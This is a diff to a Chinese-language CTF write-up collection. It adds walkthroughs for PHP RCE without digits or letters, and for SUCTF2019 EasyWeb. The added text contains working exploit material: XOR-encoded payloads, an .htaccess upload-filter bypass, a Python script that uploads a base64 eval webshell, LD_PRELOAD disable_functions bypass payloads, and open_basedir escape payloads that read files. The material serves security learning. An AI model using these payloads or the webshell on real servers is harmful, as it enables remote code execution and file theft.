@@ -3246,7 +3246,11 @@ payload:
     
     所以此处可以使`username`为想要执行的命令。用bp抓包，会发现响应头中有访问链接，访问之后发现命令成功执行。以这种方式就可以得到flag。
 
-## [极客大挑战] RCE ME(无数字字母绕过)
+## 无数字字母RCE
+
+[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
+
+### [极客大挑战] RCE ME(无数字字母绕过+dis_function绕过)
 
   无数字字母绕过 + 环境变量 `LD_preload + mail`劫持so执行系统命令
 
@@ -3280,6 +3284,196 @@ url解码之后就是 `?code=phpinfo();`
   2. 环境变量 `LD_preload + mail`劫持so执行系统命令，用蚁剑连接后，上传`./tools/bypass_disapblefunc_via_PRELOAD/bypass_disablefunc_x64.so`和`./tools/bypass_disapblefunc_via_PRELOAD/bypass_disablefunc_x64.php`
 
   重新构造payload:`?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/bypass_disablefunc.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so`
+
+### [SUCTF2019]EasyWeb(open_basedir绕过)
+
+- 题目源码如下
+---------------
+
+```php
+<?php
+function get_the_flag(){
+    // webadmin will remove your upload file every 20 min!!!! 
+    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
+    if(!file_exists($userdir)){
+    mkdir($userdir);
+    }
+    if(!empty($_FILES["file"])){
+        $tmp_name = $_FILES["file"]["tmp_name"];
+        $name = $_FILES["file"]["name"];
+        $extension = substr($name, strrpos($name,".")+1);
+    if(preg_match("/ph/i",$extension)) die("^_^"); 
+        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
+    if(!exif_imagetype($tmp_name)) die("^_^"); 
+        $path= $userdir."/".$name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    }
+}
+
+$hhh = @$_GET['_'];
+
+if (!$hhh){
+    highlight_file(__FILE__);
+}
+
+if(strlen($hhh)>18){
+    die('One inch long, one inch strong!');
+}
+
+if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
+    die('Try something else!');
+
+$character_type = count_chars($hhh, 3);
+if(strlen($character_type)>12) die("Almost there!");
+
+eval($hhh);
+?>
+```
+
+1. 第一层绕过(构造无数字字母shell)
+------------
+
+   1. 有很瞩目的`get_the_flag()`方法，最后一行是`eval($hhh)`;，题目显然是要让`$hhh`调用`get_the_flag`方法。这题对`$hhh`（即`$_GET['_']`）做了一定的限制：
+
+       - 长度不允许大于18。
+       - 不允许出现符合正则表达式的内容。
+       - 字符串所用的字符数量不能大于12个。
+
+       显然需要构造无数字字母shell来调用`get_the_flag()`方法。
+
+   2. 这个脚本可以检测出有哪些可用字符
+       ```php
+       <?php
+       for($a = 0; $a < 256; $a++){
+           if (!preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($a))){
+               echo chr($a)." ";
+           }
+       }
+       ```
+       输出
+       `! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }`
+
+   3. 异或构造shell:
+       ```php
+       <?php
+       $l = "";
+       $r = "";
+       $argv = str_split("_GET");  ##将_GET分割成一个数组，一位存一个值
+       for($i=0;$i<count($argv);$i++){   
+           for($j=0;$j<255;$j++)
+           {
+               $k = chr($j)^chr(255);    ##进行异或         
+               if($k == $argv[$i]){
+                   if($j<16){  ##如果小于16就代表只需一位即可表示，但是url要求是2位所以补个0
+                       $l .= "%ff";
+                       $r .= "%0" . dechex($j);
+                       continue;
+                   }
+                   $l .= "%ff";
+                   $r .= "%" . dechex($j);
+                   
+               }
+           }}
+       echo "\{$l`$r\}";  ### 这里的反引号只是用来区分左半边和右半边而已
+       ?>
+       ```
+   4. 构造出如下的payload
+       ```php
+       ${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&%A0=phpinfo
+       ##  1^2=2^1
+       ## 这里值得注意的是${_GET}{%A0}就等于$_GET[%A0],%A0是一个字符虽然没有被引号引起来但是php也不会将他看出是变量，这就是为什么&_GET[cmd]=&_GET["cmd"] 了。
+       ## 还有一个特性是$a=phpinfo 如果执行$a() 就相当于执行了phpinfo()
+       ```
+   5. 通过上一个payload我们看到了回显,那么我们将phpinfo替换为get_the_flag即可调用此函数。
+--------
+
+2. 绕过函数中的检测上传文件
+--------
+   1. 接下来分析get_the_flag()：
+
+       - 限制了上传的文件名。如果出现了“ph”会退出。
+       - 限制了上传的文件内容。如果内容出现了“<?”，或经exif_imagetype()检测不是图片，会退出。
+    
+   2. 检测绕过
+       
+       1. exif_imagetype()还是比较好绕过的：
+
+          - 可以用`\x00\x00\x8a\x39\x8a\x39`。
+          - 也可以用
+          ```.htaccess
+          #define width 1337
+          #define height 1337 
+          ```
+
+       2. `<?`被限制，导致大部分一句话木马都被过滤了，而`<script language='php'></script>`又只能在php5环境下使用
+       
+           所以将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码
+       
+       3. 该题环境是Apache+PHP，可以上传.htaccess文件来绕过对文件的检测：
+
+           ```.htaccess
+           \x00\x00\x8a\x39\x8a\x39 
+           AddType application/x-httpd-php .jpg 
+           php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_837ec5754f503cfaaee0929fd48974e7/shaw.jpg" 
+           ```
+
+   3. 上传脚本
+
+       ```python
+       import requests
+       import base64
+
+       htaccess = b"""
+       #define width 1337
+       #define height 1337 
+       AddType application/x-httpd-php .jpg
+       php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.jpg"
+       """
+       shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")
+       url = "http://dfcea339-b6d8-4b48-99ac-9bfaecda5527.node4.buuoj.cn:81//?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();&%86=get_the_flag"
+
+       files = {'file':('.htaccess',htaccess,'image/jpeg')}
+       data = {"upload":"Submit"}
+       response = requests.post(url=url, data=data, files=files)
+       print(response.text)
+
+       files = {'file':('shell.jpg',shell,'image/jpeg')}
+       response = requests.post(url=url, data=data, files=files)
+       print(response.text)
+       ```
+       脚本会输出两个路径，分别是.htaccess和木马的存放路径我们直接访问木马，在后面加上`?cmd=phpinfo()`
+------
+3. 绕过open_basedir
+   
+   *或者用蚁剑连接，使用bypass disable_functions插件*
+
+   [open_basedir绕过](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)
+
+   [PHP绕过open_basedir列目录](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)
+-----
+
+1. 在phpinfo页面中会发现存在open_basedir限制了访问路径
+
+    >open_basedir是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域
+
+    >假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。
+
+    >注意用open_basedir指定的限制实际上是前缀,而不是目录名。
+
+    >举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1″都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。
+
+2. payload:
+
+    ```url
+    ?cmd=mkdir('rot');chdir('rot');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(glob('*'));
+    ```
+
+    ```url
+    /upload/tmp_2c67ca1eaeadbdc1868d67003072b481/1.test?cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));
+    ```
+
+
 
 ## SUCTF2019 Pythonnginx(IDNA编码绕过)
 
@@ -4836,6 +5030,9 @@ for i in item:
 - JSON基础
 - php伪协议
 
+
+**解题**
+--------
 1. 点击初始页面的`Source Code`链接会跳转`query.php`并显示源码。
 
     ```php
